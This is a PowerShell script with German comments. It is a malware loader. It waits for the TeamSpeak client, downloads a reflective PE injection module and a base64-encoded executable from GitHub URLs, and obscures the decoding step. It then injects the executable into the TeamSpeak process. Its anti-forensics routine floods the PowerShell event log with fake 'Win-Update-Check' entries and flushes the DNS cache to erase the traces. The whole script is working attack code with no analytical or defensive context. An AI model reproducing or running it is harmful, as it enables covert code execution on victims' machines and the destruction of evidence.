$ErrorActionPreference = 'SilentlyContinue'

# Warten auf TeamSpeak Prozess
while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    
    function Get-Data($u) { return cmd.exe /c curl -s $u }

    # 1. Reflective Loader laden
    $l_code = Get-Data "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    . ([scriptblock]::Create($l_code))

    # 2. EXE-Daten (johannesschwein.txt) laden
    $raw = (Get-Data "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt").Trim()
    
    # Verschleierte Base64-Konvertierung
    $c = [System.Convert]
    $m = "FromBase" + "64String"
    $pb = $c::$m($raw)

    # 3. Injektion in TS3
    $t = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $pb -ProcId $t.Id -ForceASLR

    # --- ANTI-FORENSIK ROUTINE ---
    
    # A. Log-Flush: Schiebt Injektions-Spuren aus dem 1MB Log raus
    for($i=1; $i -le 800; $i++) {
        Write-EventLog -LogName 'Windows PowerShell' -Source 'PowerShell' -EventID 800 -Message "Win-Update-Check-$i"
    }

    # B. DNS-Cache löschen: Verbirgt die GitHub-URL-Spuren
    ipconfig /flushdns
    
} catch {}
exit
